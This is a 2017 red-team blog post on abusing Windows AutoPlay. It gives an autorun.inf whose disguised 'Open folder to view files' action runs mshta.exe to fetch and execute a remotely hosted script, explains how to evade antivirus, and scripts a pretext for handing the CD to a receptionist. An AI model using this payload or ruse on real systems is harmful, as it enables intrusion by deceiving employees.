---
layout: post
title:  "Playing with AutoPlay"
date:   2017-08-24 00:00:00 +0000
categories: blog
image: /assets/images/2017-08-24-playing-with-autoplay-3.png
---
## Intro
First... holy balls I have a blog still. No posts in ages (well 2016 but that post was written originally in 2013)!? crikey! Thing is life got in the way and information got shared and noted via other means. This doesn’t mean I wanted to leave me blog in the dust but it did mean that a quick message to a WhatsApp group or email to work colleagues was probably easier to share information than sitting down and penning a blog post.

Anyway lets get to it...

So this originally stemmed from questions from a colleague regarding a kiosk breakout he was doing and me talking about abusing popup bubbles and boxes to attempt to break out of restrictive environments. What causes a popup bubble? well many things, including that of a CD-Rom being inserted.

So an idea formed in my head, maybe we can abuse autorun.inf still to help us in a bid to breakout of a lockdown. Turns out it lead me down a bit of a rabbit hole and I think I now have a "thing".

## Thing? or not a Thing?
So this is the question, I’m interested in your opinions if you read this at all. Is this a thing? should I be considering this a thing? Because it just doesn’t really sit right with me, I can’t help thinking that "this is by design" but if it is then I think the design needs refinement.

Have a read of what follows and see what you think.

## AutoPlay vs AutoRun
This probably isn’t news to anyone but back in the day (prior to 2010) you used to be able to write yourself a lovely little autorun.inf file that could specify a few items and you’d have yourself a USB key for example that would execute a malicious payload the moment it was mounted.

Microsoft got wise to it and disabled autorun on devices with a device type of removable_drive(1) via a patch on Windows XP.

> To enumerate device types use the following powershell command: 
> ``` PS> Get-Volume ```
> Fixed, Removable and CD-ROM device types will be listed.

It replaced it with a feature called "AutoPlay" which instead of automatically executing whatever file was specified within the autorun.inf the operating system would present a menu to you in order to choose your action.

Now you can set a default action for a particular type of media but generally the menu always appeared.

Type of media? what do you mean?

So AutoPlay would categorise media based on the files contained within the media itself. There are 3 main types:

* Pictures
* Music
* Video

and a fourth special primary type of "mixed".

If media matched any of the first 3 types, a default set of menu options would be presented, generally "view photos", "play audio via...", or "play video via...". If the fourth special type matched a menu would present itself offering the user to open the folder to view the files in windows explorer or do nothing.

There are other "types" including the ability to define other types within the registry but this article is taking place from the perspective of not having prior access to the devices.

Essentially it seems windows attempts to do content-sniffing of media content and acts appropriately. however that doesn’t lend itself well to people who produce software installations via CD, they still wanted to be able to make installation an easy process for any user so Microsoft catered for it.

On a USB key you’re by default presented with a fixed menu that is wholly determined by the media type and I don’t believe you can change this (aside from a little trickery that others have done using U3 style devices) On a CD however, things change, you can specify custom actions

## Controlling AutoPlay
So Microsoft offers folk the ability to customise the actions that can be performed when a CD-Rom is inserted, these options are still defined using the autorun.inf file and even makes use of the same terminology, retaining backwards compatibility with older CDs. So you have two basic options.

* Open – specify an executable to run on insertion of CD
* ShellExecute – Specify a file to open on insertion of CD, relying upon the OS to determine the default file handling application.

We’re particularly interested in Open in this case but i’m sure ShellExecute could prove useful in some cases.

## First Attempt at Weaponisation
With the basics of autorun.inf understood. i’m curious what can we do with this that may be different to traditional use of autorun.inf? From reviewing the autorun.inf documentation on technet it became apparent that the Open command will happily take a filepath, not a relative one but a full filepath, allowing you to specify any executable on the host to run.

Wait, a CD-Rom can run any executable it likes on the OS as part of the autoplay feature?

Well that’s useful if we’re trying to pop out of a restricted environment and being unable to browse say the local filesystem, if we can get autoplay to pop, a click later we could be running powershell, iexplore.exe or any other exe that will enable us to breakout, depending on GPO obviously.

Okay, chances are if autoplay can run it, we could find other ways of calling those apps but hey, it could result in a quick and easy insert cd and pop out of the restriction.

Back to reading technet and this gem stuck out from within the Open parameter description:

> You can also include one or more command-line parameters to pass to the startup application.

So as a default thing, I can get a menu entry on autoplay to attempt to execute any OS executable complete with a nice list of arguments and my CD doesn’t even need any content beyond an autorun.inf file?

This sounds ripe for abuse and this is where a bit of inside-the-box thinking comes into play.

[Subtee](https://twitter.com/subTee) – A man who has gone to town on windows executables and bypassing DG/Applocker/SRP has a few tasty ways of getting scripting languages to pop on a box. Let’s take what he’s taught us over the last few years and put a little something together.

![](/assets/images/2017-08-24-playing-with-autoplay-1.png)

*Using MSHTA method to pop shells*

Okay so we’ve got something here, problem is, it looks dodge as hell as it comes up as mshta.exe, the "Published by Microsoft Windows" bit is a nice touch however, adds some legitimacy to the whole affair and I guess its a consequence of using a signed binary.

Lets see what we can do to make it look a little better.

## Keeping up Appearances
Using the same technet resource as before we can see a few other options available for us.

We can customise the "action" text associated with an autoplay entry.

So "Execute mshta.exe" can be changed to say "CLICK HERE FOR FUNTIMES!" or more usefully, "Open folder to view files".

We can also customise the icon displayed associated with that default action and this is where a little bit of recon for your targets may come in handy as the icon associated with the "Open folder to view files" action varies based on OS.

So a few changes later, our autorun.inf file looks like this:

```
[autorun]
action=Open folder to view files
icon=icon2.ico
open=mshta.exe vbscript:GetObject("script:http://127.0.0.1:80/webapp/static/91f3c_rg")(window.close)
```

and we’ve for argument sake included the icon file on the CD itself, its not malicious it should never be flagged.

![](/assets/images/2017-08-24-playing-with-autoplay-2.png)

*Even better, we used Joliet mode and set the files to "hidden"...*

I’ve set up a nice internet hosted script that will be grabbed by the exploit code (yay for proxy aware executables!) and now for the final reveal.

![](/assets/images/2017-08-24-playing-with-autoplay-3.png)

*Now with custom text and icon!*

Final bit of dressing up is asking explorer.exe to pop open and display the CD Drive, luckily because the working folder is in fact the CD drive itself we can easily do this by just appending explorer.exe to the end of our payload.

## Conclusions
With a little bit of luck (we can make it through the night) and a little recon via email and monitoring user agents we can develop a completely benign CD targeted against our specific client infrastructure that if scanned won’t flag to AV because autoruns.inf isn’t executable right? that actually runs malicious code should the user click the default action associated with the CD (This was tested against windows defender, your mileage may vary).

If the user chooses not to answer the popup, and double clicks the CD instead, it’ll also run the action.

Final video of exploitation is here.

<iframe width="560" height="315" src="https://www.youtube.com/embed/2uUIsyTsuqU?si=IcmaciFeLqg581oW" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

I also noticed a few things I forgot to point out at the end of the last vid so here’s an addendum 🙂

<iframe width="560" height="315" src="https://www.youtube.com/embed/ThjK_E1OTBQ?si=-AtX7UuxPz19xj0d" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## Deployment
So this is the awkward thing, anyone in the UK doing red team engagements is probably aware of the dangers of the traditional "USB DROP" in the car park. It’s dangerous, can result in malicious code being executed on non-target PCs and generally iffy.

Also most people these days undergoing security awareness training have it drilled into them that USB devices are bad and shouldn’t be plugged into corporate machines.

Then there is the disabling of USB devices, no USB Mass Storage Drivers, etc. DLP technologies.

The beauty of a non-writable CD-Rom it’s seen as benign, okay sure i’ve worked in places where executables hosted on a CD-Rom are deliberately prevented from executing, but this isn’t hosting any executables. This attack method doesn’t introduce anything into the environment via CD-Rom beyond a little one-line script/shortcut execution.

Yes CD-Rom’s these days are falling out of favour, Yes you can use this with other techniques that turn USB keys into CD-Rom appearing drives ([2](https://spareclockcycles.org/2010/11/21/the-usb-stick-o-death/)), but this is targeting the Receptionist’s PC.

We’ve established carpark drops are iffy, what can we do as a red teamer or SE person to ensure our payload gets delivered to a less iffy location?

Why not just walk in and hand it to someone?

> Me: "Hi, er I think this CD may have come from one of your staff members. I found it in the car park"
>
> *hands CD to receptionist*
>
> Me: "Looks like it’s wedding photos, i’d be devastated if I lost mine so thought I’d try and get it back to them"
>
> Receptionist/Security: "Sure! Thanks, no worries i’ll see if it’s any of our employees"

Voila!

* CDs weren’t covered in their last e-learning on Security Awareness Training
* You’ve given the CD directly to an employee of the company
* You’ve given a back story that encourages the employee to view the wedding photos to identify a staff member.

Happy Phishing!

## References
1. <https://msdn.microsoft.com/en-us/library/windows/desktop/cc144206(v=vs.85).aspx>
2. <https://spareclockcycles.org/2010/11/21/the-usb-stick-o-death/>